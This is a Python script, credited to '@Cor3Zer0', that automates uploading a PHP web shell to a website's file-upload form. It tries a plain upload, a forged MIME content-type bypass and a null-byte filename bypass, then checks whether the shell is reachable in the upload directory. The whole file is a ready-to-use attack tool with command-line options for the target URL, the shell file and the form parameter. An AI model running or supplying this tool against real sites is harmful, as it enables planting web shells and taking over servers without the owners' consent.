#!/usr/bin/env python

"""
Python Shell Uploader
written by @Cor3Zer0
"""

import requests
import os
import mimetypes
import argparse
import sys
from shutil import copyfile

"""Global variables"""
mimetypes.init()
files_folder = 'files/'
extra_mime_types = {'php': 'text/x-php'}


def banner():
    print ''
    print '  ____        _   _                   _____ _ _        _   _       _                 _           '
    print ' |  _ \ _   _| |_| |__   ___  _ __   |  ___(_) | ___  | | | |_ __ | | ___   __ _  __| | ___ _ __ '
    print " | |_) | | | | __| '_ \ / _ \| '_ \  | |_  | | |/ _ \ | | | | '_ \| |/ _ \ / _` |/ _` |/ _ \ '__|"
    print ' |  __/| |_| | |_| | | | (_) | | | | |  _| | | |  __/ | |_| | |_) | | (_) | (_| | (_| |  __/ |   '
    print ' |_|    \__, |\__|_| |_|\___/|_| |_| |_|   |_|_|\___|  \___/| .__/|_|\___/ \__,_|\__,_|\___|_|   '
    print '       |___/                                               |_|                                  '
    print 'by Cor3Zer0'
    print ''


def file_upload(url, upload_file, file_name, mime_type, upload_parameter):
    files = {upload_parameter: (file_name, open(upload_file, 'rb'), mime_type)}

    print 'Uploading shell as %s to %s' % (file_name, url)

    r = requests.post(url, files=files)

    if r.status_code == 200:
        return True
    else:
        return False


def file_check(upload_dir, upload_file):
    upload_dir_file = ''.join([upload_dir, upload_file])

    print 'Checking for successful upload at %s' % upload_dir_file

    r = requests.get(upload_dir_file)

    if r.status_code == 200:
        return True
    else:
        return False


def upload_shell(url, shell_location, upload_parameter, upload_dir):
    """
    attempt to upload the shell without any bypass
    """
    print 'Simple Upload'

    mime_type = 'text/x-php'
    shell_filename = os.path.basename(shell_location)

    file_upload(url, shell_location, shell_filename, mime_type, upload_parameter)

    if file_check(upload_dir, shell_filename):
        print 'Upload successful at %s%s' % (upload_dir, shell_filename)
    else:
        print 'Upload failed or file renamed'

    print ''


def bypass_content_type(url, shell_location, mime_type, upload_parameter, upload_dir):
    """
    attempt to upload shell by changing the mime type to a supported one
    """
    print 'Content Type Bypass'

    shell_filename = os.path.basename(shell_location)

    file_upload(url, shell_location, shell_filename, mime_type, upload_parameter)

    if file_check(upload_dir, shell_filename):
        print 'Upload successful at %s%s' % (upload_dir, shell_filename)
    else:
        print 'Upload failed or file renamed'

    print ''


def bypass_nullbyte(url, shell_location, mime_type, accepted_filetypes, upload_parameter, upload_dir):

    shell_filename = os.path.basename(shell_location)
    #nullbyte_file_location = files_folder + shell_file + '%00.' + accepted_filetypes
    #copyfile(shell_location, nullbyte_file_location)

    nullbyte_filename = shell_filename + '%00' + accepted_filetypes


    print 'Null Byte Bypass'

    file_upload(url, shell_location, nullbyte_filename, mime_type, upload_parameter)

    if file_check(upload_dir, shell_filename):
        print 'Upload successful. Shell link %s' % ''.join([url, shell_filename])
    else:
        print 'Shell not found on server. Checking if nullbyte ignored'
        if file_check(upload_dir, nullbyte_filename):
            print 'Upload successful but nullbyte ignored. File link %s' % ''.join([url, nullbyte_filename])
        else:
            print 'Upload failed or file renamed'

    print ''



def run_me(url, shell, upload_dir, accepted_filetypes, upload_parameter):
    """
    Run some of the modules
    """
    try:
        mime_type = mimetypes.types_map[''.join(['.', accepted_filetypes])]
    except:
        if accepted_filetypes in extra_mime_types:
            mime_type = extra_mime_types[accepted_filetypes]
        else:
            sys.exit('Unable to find mime type of %s. Please add it to extra_mime_types' %accepted_filetypes)

    upload_shell(url, shell, upload_parameter, upload_dir)
    bypass_content_type(url, shell, mime_type, upload_parameter, upload_dir)
    bypass_nullbyte(url, shell, mime_type, accepted_filetypes, upload_parameter, upload_dir)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Upload shell to server.')
    parser.add_argument(
        '-u',
        action='store',
        dest='url',
        help='The URL of the upload page e.g. http://www.example.com/upload.php',
        required=True)
    parser.add_argument(
        '-s',
        action='store',
        dest='shell',
        help='The shell to try and upload',
        required=True)
    parser.add_argument(
        '-d',
        action='store',
        dest='upload_dir',
        help='The directory where the upload is placed e.g. http://www.example.com/uploads/',
        required=True)
    parser.add_argument(
        '-f',
        action='store',
        dest='accepted_filetypes',
        help='The file types accepted by the uploader e.g. jpg,png,pdf',
        required=True)
    parser.add_argument(
        '-p',
        action='store',
        dest='upload_paramater',
        help="The paramater of the file upload e.g. image",
        required=True)

    results = parser.parse_args()
    if not os.path.isfile(results.shell):
        sys.exit("%s not found" % results.shell)
    banner()
    run_me(results.url, results.shell, results.upload_dir, results.accepted_filetypes, results.upload_paramater)
